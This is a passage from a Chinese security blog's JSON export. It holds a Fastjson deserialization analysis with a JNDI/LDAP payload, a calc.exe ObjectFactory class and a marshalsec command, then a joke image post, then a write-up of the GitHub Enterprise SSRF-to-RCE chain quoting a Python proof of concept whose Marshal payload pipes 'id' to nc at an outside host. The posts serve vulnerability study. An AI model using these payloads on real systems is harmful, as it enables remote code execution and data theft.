&#125;</span><br></pre></td></tr></table></figure>\n\n<p>loadClass接收的一个参数:”className”为String类型变量，根据上文的调用关系，这里传入的是字符串”com.sun.rowset.JdbcRowSetImpl”,即className参数值为”com.sun.rowset.JdbcRowSetImpl”</p>\n<p>通过分析loadClass方法代码，可以发现如下代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(contextClassLoader != <span class=\"keyword\">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class=\"line\">        clazz = contextClassLoader.loadClass(className);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">            mappings.put(className, clazz);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量(“com.sun.rowset.JdbcRowSetImpl”)获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f4935a82428a0c6642e7509665520283.png\"></p>\n<p>接着，程序判断cache变量情况：在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/841cfa794636ad9294c1c64afe0c1522.png\"></p>\n<p>经过动态调试可以发现，通过上面的一系列操作，Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/627c0a9c95e6249cd96f15fcfb201c8c.png\"></p>\n<p>在我们的第一个json字符串解析完成后，程序随后会解析我们第二个json字符串</p>\n<h3 id=\"“b”-“-type”-”com-sun-rowset-JdbcRowSetImpl”-”dataSourceName”-”ldap-localhost-1389-ExecTest”-”autoCommit”-true-解析过程\"><a href=\"#“b”-“-type”-”com-sun-rowset-JdbcRowSetImpl”-”dataSourceName”-”ldap-localhost-1389-ExecTest”-”autoCommit”-true-解析过程\" class=\"headerlink\" title=\"“b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}解析过程\"></a>“b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}解析过程</h3><p>与第一个json字符串解析流程完全一致，程序也执行到下图部分</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/24ef953b36ad28dd753484d28f2a5ffb.png\"></p>\n<p>由于这次Mapping中有键名为com.sun.rowset.JdbcRowSetImpl的元素，因此clazz被赋值为com.sun.rowset.JdbcRowSetImpl类对象</p>\n<p>从下面两张图可见，此时上文的流程完全一致，只不过这次返回的时com.sun.rowset.JdbcRowSetImpl类对象</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a680629fb9e9f50beaff134655281076.png\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5918f6f889685868b8888d34093a5b47.png\"></p>\n<p>com.sun.rowset.JdbcRowSetImpl恶意类被顺利返回，但是整个操作流程中并未触发checkAutoType黑白名单校验机制。随后com.sun.rowset.JdbcRowSetImpl恶意类被反序列化，触发漏洞利用</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>为了证实漏洞的存在，我们首先在192.167.30.116服务器的80端口web服务上部署ExecTest.class。ExecTest.java中内容如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Context;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Name;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.spi.ObjectFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ExecTest</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectFactory</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObjectInstance</span><span class=\"params\">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class=\"line\">        exec(<span class=\"string\">&quot;xterm&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">exec</span><span class=\"params\">(String cmd)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        exec(<span class=\"string\">&quot;123&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用marshalsec开启ladp服务，监听在1389端口</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">java</span> -cp marshalsec-<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">3</span>-SNAPSHOT-<span class=\"literal\">all</span>.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://192.167.30.116/java/#ExecTest&quot;</span> <span class=\"number\">1389</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145806799.png\" alt=\"image-20200918145806799\"></p>\n<p>demo程序执行完毕，计算器成功弹出</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145737798.png\" alt=\"image-20200918145737798\"></p>\n"},{"title":"日常皮一下","date":"2019-11-21T05:27:56.000Z","cover":"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" >\n\n<!--more-->\n\n-----------------------------------------------------------------------------------------------------------------------------------------------------------\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fkZR.jpg\" alt=\"M5fkZR.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fpzF.jpg\" alt=\"M5fpzF.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fCM4.jpg\" alt=\"M5fCM4.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fSRU.jpg\" alt=\"M5fSRU.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5WxiV.jpg\" alt=\"M5WxiV.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fPsJ.jpg\" alt=\"M5fPsJ.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fiL9.jpg\" alt=\"M5fiL9.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fAd1.jpg\" alt=\"M5fAd1.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" style=\"height: 295px;width: 393px;\">\n\n","source":"_posts/forfun.md","raw":"---\ntitle: 日常皮一下\ndate: 2019-11-21 13:27:56\ntags: 杂文\ncategories: 日常\ncover: https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" >\n\n<!--more-->\n\n-----------------------------------------------------------------------------------------------------------------------------------------------------------\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fkZR.jpg\" alt=\"M5fkZR.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fpzF.jpg\" alt=\"M5fpzF.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fCM4.jpg\" alt=\"M5fCM4.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fSRU.jpg\" alt=\"M5fSRU.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5WxiV.jpg\" alt=\"M5WxiV.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fPsJ.jpg\" alt=\"M5fPsJ.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fiL9.jpg\" alt=\"M5fiL9.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fAd1.jpg\" alt=\"M5fAd1.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" style=\"height: 295px;width: 393px;\">\n\n","slug":"forfun","published":1,"updated":"2020-10-27T09:25:29.380Z","_id":"ckgrozu9i003mwsa91nhk648h","comments":1,"layout":"post","photos":[],"link":"","content":"<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" >\n\n<a id=\"more\"></a>\n\n<hr>\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fkZR.jpg\" alt=\"M5fkZR.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fpzF.jpg\" alt=\"M5fpzF.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fCM4.jpg\" alt=\"M5fCM4.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fSRU.jpg\" alt=\"M5fSRU.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5WxiV.jpg\" alt=\"M5WxiV.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fPsJ.jpg\" alt=\"M5fPsJ.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fiL9.jpg\" alt=\"M5fiL9.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fAd1.jpg\" alt=\"M5fAd1.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" style=\"height: 295px;width: 393px;\">\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" >","more":"<hr>\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fkZR.jpg\" alt=\"M5fkZR.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fpzF.jpg\" alt=\"M5fpzF.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fCM4.jpg\" alt=\"M5fCM4.jpg\" style=\"height: 295px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fSRU.jpg\" alt=\"M5fSRU.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5WxiV.jpg\" alt=\"M5WxiV.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fPsJ.jpg\" alt=\"M5fPsJ.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fiL9.jpg\" alt=\"M5fiL9.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fAd1.jpg\" alt=\"M5fAd1.jpg\" style=\"height: 350px;width: 393px;\">\n\n<img src=\"https://s2.ax1x.com/2019/11/21/M5fEIx.jpg\" alt=\"M5fEIx.jpg\" style=\"height: 295px;width: 393px;\">"},{"title":"GitHub Enterprise远程代码执行解读","date":"2017-08-16T07:29:05.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nGitHub Enterprise和GitHub的服务类似，不过它为大型企业的开发团队量身定制。\n\n根据Github官方博客：GitHub Enterprise包括了Github之前的所有主要功能，包括提交历史、代码浏览、比较视图、推送请求、问题追踪、Wiki、Gist共享代码段、团队管理等，此外，还提供了更强大的API以及一个更漂亮的Web界面。\n\n在GitHub Enterprise上，你可以在自己的服务器本地运行这些功能。\n\n<!--more-->\n\n## 漏洞解读\n\n在GitHub Enterprise中，有一个名为WebHook的功能。关于WebHook，我在下面简单的介绍下：\n\nWebhook是什么？\n\nWebhook，也就是人们常说的钩子，是一个很有用的工具。可以通过定制 Webhook 来监测用户在 Github.com 上的各种事件，最常见的莫过于 push 事件。如果用户设置了一个监测 push 事件的 Webhook，那么每当用户的这个项目有了任何提交，这个 Webhook 都会被触发，这时 Github 就会发送一个 HTTP POST 请求到用户配置好的地址。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/1-4.png) ![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)\n\nGitHub Enterprise中的WebHook功能，在Hooks&amp;services配置选项下。它能在执行选定git操作时执行时自定义HTTP回调。\n\nGitHub Enterprise通过Gem的faraday-restrict-ip-addresses功能来防止用户请求内部服务。下面看下faraday-restrict-ip-addresses功能是如何防止ssrf的：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/2-5.png)\n\n这里可以看出，它是通过限定了一个黑名单的方式，来避免用户在WebHook中添加内网地址。\n\n漏洞发现者提供了一个方法来绕过这层防护，他提出可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过它：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/3-4.png)\n\n这个地址在Linux系统中，0代表的是localhost，在绕过faraday-restrict-ip-addresses中的黑名单同时，可以访问服务器内网资源。\n\n现在我们可以访问内网资源了，应该想到的的是利用缓存数据进行反序列化来利用，以redis为例，我们要想在redis中写入反序列化数据，就想到要用Python的urllib库曾出过一个头注入的漏洞（CVE-2016-5699）来构造http头向redis写入数据。\n\n再来看看我们现在控制的这处ssrf，它有一个问题，它是基于通过ruby-Gem的faraday来解析数据的，faraday中不存在CR-LF命令注入，所以没办法通过这个ssrf构造http头向缓存中写东西的。\n\n下面的思路就是，我们要找到一个内网服务，它需要是python写的（存在头注入的漏洞），并且它也得存在一个ssrf，用来访问本地的缓存服务并向其中写入数据。\n\n漏洞发现者找到了GitHub Enterprise中的一个这样的服务：**Graphite****服务，**Graphite中有一个ssrf漏洞，位于\n\nwebapps/graphite/composer/views.py\n\n**![](http://blog.nsfocus.net/wp-content/uploads/2017/08/4-4.png)**\n\n可以看出Graphite服务可以接收url地址并进行利用，如果后台采用redis进行缓存，漏洞发现者给出下面的利用构造：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)\n\n（注：Graphite服务启用在本地8000端口）\n\n但是漏洞发现者发现“GitHub Enterprise使用Ruby Gem的Memcached方式来处理缓存，而其通过Marshal模块进行封装” 。并且他提到“GitHub Enterprise Rails控制端中存在反序列化漏洞的Marshal” Marshal模块的反序列化漏洞这里就不介绍了，可以自己分析一下。\n\n## 漏洞利用\n\n因此最后构造的poc如下：\n\n#!/usr/bin/python\n\nfrom urllib import quote\n\n''' set up the marshal payload from IRB\n\ncode = \"`id | nc orange.tw 12345`\"\n\np \"\\x04\\x08\" + \"o\"+\":\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\"+\"\\x07\" + \":\\x0E@instance\" + \"o\"+\":\\x08ERB\"+\"\\x07\" + \":\\x09@src\" + Marshal.dump(code)[2..-1] + \":\\x0c@lineno\"+ \"i\\x00\" + \":\\x0C@method\"+\":\\x0Bresult\"\n\n'''\n\nmarshal_code = '\\x04\\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\x07:\\x0e@instanceo:\\x08ERB\\x07:\\t@srcI\"\\x1e`id | nc orange.tw 12345`\\x06:\\x06ET:\\x0c@linenoi\\x00:\\x0c@method:\\x0bresult'\n\npayload = [\n\n'',\n\n'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),\n\nmarshal_code,\n\n'',\n\n''\n\n]\n\npayload = map(quote, payload)\n\nurl = 'http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/'\n\nprint \"\\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by orange@chroot.org\"\n\nprint '-'*10 + '\\n'\n\nprint url + '%0D%0A'.join(payload)\n\nprint '''\n\nInserting WebHooks from:\n\nhttps://ghe-server/:user/:repo/settings/hooks\n\nTriggering RCE from:\n\nhttps://ghe-server/search?q=ggggg&amp;type=Repositories\n\n'''\n\n&nbsp;\n\n参考链接\n\nhttp://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html","source":"_posts/github-enterprise-rce.md","raw":"---\ntitle: GitHub Enterprise远程代码执行解读\ndate: 2017-08-16 15:29:05\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nGitHub Enterprise和GitHub的服务类似，不过它为大型企业的开发团队量身定制。\n\n根据Github官方博客：GitHub Enterprise包括了Github之前的所有主要功能，包括提交历史、代码浏览、比较视图、推送请求、问题追踪、Wiki、Gist共享代码段、团队管理等，此外，还提供了更强大的API以及一个更漂亮的Web界面。\n\n在GitHub Enterprise上，你可以在自己的服务器本地运行这些功能。\n\n<!--more-->\n\n## 漏洞解读\n\n在GitHub Enterprise中，有一个名为WebHook的功能。关于WebHook，我在下面简单的介绍下：\n\nWebhook是什么？\n\nWebhook，也就是人们常说的钩子，是一个很有用的工具。可以通过定制 Webhook 来监测用户在 Github.com 上的各种事件，最常见的莫过于 push 事件。如果用户设置了一个监测 push 事件的 Webhook，那么每当用户的这个项目有了任何提交，这个 Webhook 都会被触发，这时 Github 就会发送一个 HTTP POST 请求到用户配置好的地址。\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/1-4.png) ![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)\n\nGitHub Enterprise中的WebHook功能，在Hooks&amp;services配置选项下。它能在执行选定git操作时执行时自定义HTTP回调。\n\nGitHub Enterprise通过Gem的faraday-restrict-ip-addresses功能来防止用户请求内部服务。下面看下faraday-restrict-ip-addresses功能是如何防止ssrf的：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/2-5.png)\n\n这里可以看出，它是通过限定了一个黑名单的方式，来避免用户在WebHook中添加内网地址。\n\n漏洞发现者提供了一个方法来绕过这层防护，他提出可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过它：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/3-4.png)\n\n这个地址在Linux系统中，0代表的是localhost，在绕过faraday-restrict-ip-addresses中的黑名单同时，可以访问服务器内网资源。\n\n现在我们可以访问内网资源了，应该想到的的是利用缓存数据进行反序列化来利用，以redis为例，我们要想在redis中写入反序列化数据，就想到要用Python的urllib库曾出过一个头注入的漏洞（CVE-2016-5699）来构造http头向redis写入数据。\n\n再来看看我们现在控制的这处ssrf，它有一个问题，它是基于通过ruby-Gem的faraday来解析数据的，faraday中不存在CR-LF命令注入，所以没办法通过这个ssrf构造http头向缓存中写东西的。\n\n下面的思路就是，我们要找到一个内网服务，它需要是python写的（存在头注入的漏洞），并且它也得存在一个ssrf，用来访问本地的缓存服务并向其中写入数据。\n\n漏洞发现者找到了GitHub Enterprise中的一个这样的服务：**Graphite****服务，**Graphite中有一个ssrf漏洞，位于\n\nwebapps/graphite/composer/views.py\n\n**![](http://blog.nsfocus.net/wp-content/uploads/2017/08/4-4.png)**\n\n可以看出Graphite服务可以接收url地址并进行利用，如果后台采用redis进行缓存，漏洞发现者给出下面的利用构造：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png)\n\n（注：Graphite服务启用在本地8000端口）\n\n但是漏洞发现者发现“GitHub Enterprise使用Ruby Gem的Memcached方式来处理缓存，而其通过Marshal模块进行封装” 。并且他提到“GitHub Enterprise Rails控制端中存在反序列化漏洞的Marshal” Marshal模块的反序列化漏洞这里就不介绍了，可以自己分析一下。\n\n## 漏洞利用\n\n因此最后构造的poc如下：\n\n#!/usr/bin/python\n\nfrom urllib import quote\n\n''' set up the marshal payload from IRB\n\ncode = \"`id | nc orange.tw 12345`\"\n\np \"\\x04\\x08\" + \"o\"+\":\\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\"+\"\\x07\" + \":\\x0E@instance\" + \"o\"+\":\\x08ERB\"+\"\\x07\" + \":\\x09@src\" + Marshal.dump(code)[2..-1] + \":\\x0c@lineno\"+ \"i\\x00\" + \":\\x0C@method\"+\":\\x0Bresult\"\n\n'''\n\nmarshal_code = '\\x04\\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\x07:\\x0e@instanceo:\\x08ERB\\x07:\\t@srcI\"\\x1e`id | nc orange.tw 12345`\\x06:\\x06ET:\\x0c@linenoi\\x00:\\x0c@method:\\x0bresult'\n\npayload = [\n\n'',\n\n'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),\n\nmarshal_code,\n\n'',\n\n''\n\n]\n\npayload = map(quote, payload)\n\nurl = 'http://0:8000/composer/send_email?to=orange@chroot.org&amp;url=http://127.0.0.1:11211/'\n\nprint \"\\nGitHub Enterprise &lt; 2.8.7 Remote Code Execution by orange@chroot.org\"\n\nprint '-'*10 + '\\n'\n\nprint url + '%0D%0A'.join(payload)\n\nprint '''\n\nInserting WebHooks from:\n\nhttps://ghe-server/:user/:repo/settings/hooks\n\nTriggering RCE from:\n\nhttps://ghe-server/search?q=ggggg&amp;type=Repositories\n\n'''\n\n&nbsp;\n\n参考链接\n\nhttp://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html","slug":"github-enterprise-rce","published":1,"updated":"2020-10-27T09:27:09.601Z","_id":"ckgrozu9j003pwsa92gh96cpm","comments":1,"layout":"post","photos":[],"link":"","content":"<p>GitHub Enterprise和GitHub的服务类似，不过它为大型企业的开发团队量身定制。</p>\n<p>根据Github官方博客：GitHub Enterprise包括了Github之前的所有主要功能，包括提交历史、代码浏览、比较视图、推送请求、问题追踪、Wiki、Gist共享代码段、团队管理等，此外，还提供了更强大的API以及一个更漂亮的Web界面。</p>\n<p>在GitHub Enterprise上，你可以在自己的服务器本地运行这些功能。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞解读\"><a href=\"#漏洞解读\" class=\"headerlink\" title=\"漏洞解读\"></a>漏洞解读</h2><p>在GitHub Enterprise中，有一个名为WebHook的功能。关于WebHook，我在下面简单的介绍下：</p>\n<p>Webhook是什么？</p>\n<p>Webhook，也就是人们常说的钩子，是一个很有用的工具。可以通过定制 Webhook 来监测用户在 Github.com 上的各种事件，最常见的莫过于 push 事件。如果用户设置了一个监测 push 事件的 Webhook，那么每当用户的这个项目有了任何提交，这个 Webhook 都会被触发，这时 Github 就会发送一个 HTTP POST 请求到用户配置好的地址。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/1-4.png\"> <img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/5-3.png\"></p>\n<p>GitHub Enterprise中的WebHook功能，在Hooks&amp;services配置选项下。它能在执行选定git操作时执行时自定义HTTP回调。</p>\n<p>GitHub Enterprise通过Gem的faraday-restrict-ip-addresses功能来防止用户请求内部服务。下面看下faraday-restrict-ip-addresses功能是如何防止ssrf的：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/2-5.png\"></p>\n<p>这里可以看出，它是通过限定了一个黑名单的方式，来避免用户在WebHook中添加内网地址。</p>\n<p>漏洞发现者提供了一个方法来绕过这层防护，他提出可以通过RFC 3986定义的稀有IP地址格式（Rare IP Address Formats）来绕过它：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2017/08/3-4.png\"></p>\n<p>这个地址在Linux系统中，0代表的是localhost，在绕过faraday-restrict-ip-addresses中的黑名单同时，可以访问服务器内网资源。</p>\n<p>现在我们可以访问内网资源了，应该想到的的是利用缓存数据进行反序列化来利用，以redis为例，我们要想在redis中写入反序列化数据，就想到要用Python的urllib库曾出过一个头注入的漏洞（CVE-2016-5699）来构造http头向redis写入数据。</p>\n<p>再来看看我们现在控制的这处ssrf，它有一个问题，它是基于通过ruby-Gem的faraday来解析数据的，faraday中不存在CR-LF命令注入，所以没办法通过这个ssrf构造http头向缓存中写东西的。</p>\n<p>下面的思路就是，我们要找到一个内网服务，它需要是python写的（存在头注入的漏洞），并且它也得存在一个ssrf，用来访问本地的缓存服务并向其中写入数据。</p>\n<p>漏洞发现者找到了GitHub 